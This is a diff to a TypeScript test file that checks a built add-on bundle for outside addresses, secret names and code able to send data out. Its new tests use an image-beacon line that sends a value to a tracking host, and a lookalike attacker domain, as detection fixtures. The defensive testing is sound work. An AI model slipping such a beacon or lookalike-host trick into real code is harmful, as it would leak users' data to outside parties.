@@ -23,6 +23,8 @@
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 
+import { foreignImportsIn, offendingAddresses, sendersIn } from "@adminium/add-on-host/testing";
+
 import { OUTPUT } from "../vite.config.ts";
 import { OAUTH, VENDOR_API_HOST } from "./oauth.ts";
 import { DIST, PACKAGE_ROOT, distFiles, distRelative, ensureFreshBuild, readDist } from "./testing/built.ts";
@@ -86,12 +88,12 @@ const ALLOWED_TOKENS: Record<string, string> = {
   "Probíhají": "cs-CZ — 'are running', of the checks",
 
   // ── English identifiers and comment words ────────────────────────────────
-  //    `product*` and `provenance` are field names, two of them dictated by
-  //    the host's own slot payload (`job.ts`), so they cannot be renamed away
-  //    from this list without breaking the seam.
-  product: "identifier — the host's Configuration field",
-  productKey: "identifier — JobSpec field, host's shape",
-  productLabel: "identifier — JobSpec field, host's shape",
+  //    `product`, `productKey` and `productLabel` used to be here, and their
+  //    removal is the visible half of a real change: this add-on carried a copy
+  //    of one host's size table and resolved the job itself, so those field
+  //    names were in the bundle. The host resolves the job now and the payload
+  //    arrives in millimetres, so the identifiers are gone — and the check
+  //    below, which fails on a carve-out nothing needs, is what noticed.
   provenance: "identifier — how the file on screen got there",
   Promise: "identifier — the language's own",
   stopPropagation: "identifier — the DOM's own",
@@ -366,5 +368,62 @@ describe("the client / server split survives bundling (24 D15, AC10)", () => {
       /api_key|apiKey|client_secret|clientSecret|access_token|refresh_token/.test(readDist(f)),
     );
     expect(offenders.map(distRelative)).toEqual([]);
+  });
+});
+
+/**
+ * D11 OVER THE ARTEFACT, AND THE ONE ADD-ON WHERE IT HAS SOMETHING TO SAY.
+ *
+ * `sources.test.ts` states the rule over the sources; this states it over the
+ * bytes. They are not the same check: `oauth.ts` writes its token URL as
+ * `https://${VENDOR_API_HOST}/…`, and a bundler FOLDS that template into a
+ * finished `https://api.canva.com/…` — an address that exists only after a
+ * build, which no source grep can see and which the sweep would read.
+ *
+ * So the allow-list here is written in the artefact's own spelling, and the
+ * point of the second case is that the declared endpoints stay harmless: this
+ * bundle carries nothing that could call them. An address with no way to send
+ * is a string. A verifier proved the reverse shape by putting an image beacon
+ * into a sibling package and watching every gate in three repos stay green.
+ */
+describe("nothing in the artefact can reach a host we do not control (24 D11)", () => {
+  const INERT = [
+    {
+      origin: "https://www.canva.com",
+      why: "the declared authorize URL. The HOST performs the redirect (24 §5.6); nothing here calls it",
+    },
+    {
+      origin: `https://${VENDOR_API_HOST}`,
+      why: "the declared token URL, folded out of its template by the build. The host runs the exchange",
+    },
+  ];
+
+  it("names no address outside the two endpoints the manifest pins", () => {
+    const offences = SHIPPED.flatMap((file) =>
+      offendingAddresses(readDist(file), INERT).map((url) => `${distRelative(file)} → ${url}`),
+    );
+    expect(offences).toEqual([]);
+  });
+
+  it("carries nothing that could call them, which is what makes naming them safe", () => {
+    const offences = SHIPPED.flatMap((file) => [
+      ...sendersIn(readDist(file)).map((means) => `${distRelative(file)} → ${means}`),
+      ...foreignImportsIn(readDist(file)).map((spec) => `${distRelative(file)} → ${spec}`),
+    ]);
+    expect(offences).toEqual([]);
+  });
+
+  it("forgives an origin exactly, never a host that merely starts the same way", () => {
+    // The shape of the allowance matters as much as its contents: a
+    // `startsWith` would have let `api.canva.com.attacker.test` through.
+    expect(offendingAddresses("https://api.canva.com/rest/v1/x", INERT)).toEqual([]);
+    expect(offendingAddresses("https://api.canva.com.attacker.test/p", INERT)).toEqual([
+      "https://api.canva.com.attacker.test/p",
+    ]);
+    const mutant = 'const i=new Image();i.src="https://tracking.example-analytics.net/p?c="+c;';
+    expect(offendingAddresses(mutant, INERT)).toEqual([
+      "https://tracking.example-analytics.net/p?c=",
+    ]);
+    expect(sendersIn(mutant)).toEqual(["new Image — an image beacon"]);
   });
 });
